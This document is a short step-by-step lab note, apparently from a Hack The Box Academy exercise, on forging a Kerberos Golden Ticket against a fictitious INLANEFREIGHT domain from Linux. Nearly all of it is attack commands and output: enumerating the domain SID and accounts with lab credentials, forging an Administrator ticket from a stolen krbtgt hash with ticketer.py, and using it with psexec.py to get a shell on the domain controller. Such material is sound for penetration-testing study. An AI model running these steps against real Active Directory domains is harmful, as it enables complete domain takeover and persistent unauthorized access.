# Golden Ticket from Linux

## Hosts File

```sh
my@attack:~$ echo "10.129.68.218 inlanefreight.local dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Retrieving Domain SID

```sh
my@attack:~$ lookupsid.py 'INLANEFREIGHT.LOCAL'/'htb-student':'HTB_@cademy_stdnt!'@DC01.INLANEFREIGHT.LOCAL -domain-sids
```

```output title="Output" hl_lines="3"
[*] Brute forcing SIDs at DC01.INLANEFREIGHT.LOCAL
[*] StringBinding ncacn_np:DC01.INLANEFREIGHT.LOCAL[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1870146311-1183348186-593267556
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\Administrator (SidTypeUser)
501: INLANEFREIGHT\Guest (SidTypeUser)
502: INLANEFREIGHT\krbtgt (SidTypeUser)
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
513: INLANEFREIGHT\Domain Users (SidTypeGroup)
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
520: INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)
521: INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
522: INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)
525: INLANEFREIGHT\Protected Users (SidTypeGroup)
526: INLANEFREIGHT\Key Admins (SidTypeGroup)
527: INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)
553: INLANEFREIGHT\RAS and IAS Servers (SidTypeAlias)
571: INLANEFREIGHT\Allowed RODC Password Replication Group (SidTypeAlias)
572: INLANEFREIGHT\Denied RODC Password Replication Group (SidTypeAlias)
1002: INLANEFREIGHT\DC01$ (SidTypeUser)
1103: INLANEFREIGHT\DnsAdmins (SidTypeAlias)
1104: INLANEFREIGHT\DnsUpdateProxy (SidTypeGroup)
1105: INLANEFREIGHT\derek.walker (SidTypeUser)
1106: INLANEFREIGHT\carole.holmes (SidTypeUser)
1107: INLANEFREIGHT\callum.dixon (SidTypeUser)
1108: INLANEFREIGHT\beth.richards (SidTypeUser)
1109: INLANEFREIGHT\amber.smith (SidTypeUser)
1110: INLANEFREIGHT\jenna.smith (SidTypeUser)
1111: INLANEFREIGHT\carole.rose (SidTypeUser)
1112: INLANEFREIGHT\sqldev (SidTypeUser)
1113: INLANEFREIGHT\sqlprod (SidTypeUser)
1114: INLANEFREIGHT\sqlqa (SidTypeUser)
1115: INLANEFREIGHT\sql-test (SidTypeUser)
1116: INLANEFREIGHT\adam.jones (SidTypeUser)
1117: INLANEFREIGHT\jacob.kelly (SidTypeUser)
1118: INLANEFREIGHT\DMZ01$ (SidTypeUser)
1119: INLANEFREIGHT\SQL01$ (SidTypeUser)
1120: INLANEFREIGHT\WS01$ (SidTypeUser)
1121: INLANEFREIGHT\FILER01$ (SidTypeUser)
1122: INLANEFREIGHT\daniel.whitehead (SidTypeUser)
1123: INLANEFREIGHT\annette.jackson (SidTypeUser)
1124: INLANEFREIGHT\sandra.murphy (SidTypeUser)
1125: INLANEFREIGHT\debra.rogers (SidTypeUser)
1126: INLANEFREIGHT\htb-student (SidTypeUser)
1127: INLANEFREIGHT\brian.willis (SidTypeUser)
2103: INLANEFREIGHT\matilda.kens (SidTypeUser)
```

## Forging the Golden Ticket (TGT)

!!! warning

    KRBTGT hesabı daha önceden ele geçirildi.

```sh
my@attack:~$ ticketer.py Administrator -nthash C0231BD8A4A4DE92FCA0760C0BA9E7A6 -domain INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-1870146311-1183348186-593267556
```

```output title="Output" hl_lines="12"
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for INLANEFREIGHT.LOCAL/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

## Using the Ticket

```sh
my@attack:~$ export KRB5CCNAME='Administrator.ccache'
my@attack:~$ psexec.py 'INLANEFREIGHT.LOCAL'/'Administrator'@DC01.INLANEFREIGHT.LOCAL -k -no-pass
```
